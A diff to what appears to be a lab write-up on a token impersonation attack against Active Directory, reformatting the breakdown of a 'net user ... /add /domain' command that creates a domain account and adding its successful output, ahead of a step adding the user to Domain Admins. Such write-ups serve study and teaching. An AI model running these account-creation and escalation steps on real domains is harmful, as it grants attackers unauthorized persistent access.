@@ -461,16 +461,27 @@ The following command creates a new domain user named `testuser` with the passwo
 net user test @shahin123#! /add /domain
 ```
 
-```text
-Command Breakdown
-net user – Used to manage user accounts in Windows.
-test – The username of the new account.
-@shahin123#! – The password assigned to the account.
-/add – Creates a new user account.
-/domain – Performs the action on the Active Directory domain instead of the local machine.
-```
+### Command Breakdown
+
+- `net user` – Used to manage user accounts in Windows.
+- `test` – The username of the new account.
+- `@shahin123#!` – The password assigned to the account.
+- `/add` – Creates a new user account.
+- `/domain` – Performs the action on the Active Directory domain instead of the local machine.
 
 **Output:**
+
+```
+C:\Windows\system32>net user test @shahin123#! /add /domain
+net user test @shahin123#! /add /domain
+The request will be processed at a domain controller for domain READTEAMBD.local.
+
+The command completed successfully.
+```
+
+<p align="center">
+  <img src="/writeups/token impersonation attack/images/step6.png" width="600">
+</p>
 
 ## Add a User to the Domain Admins Group
 
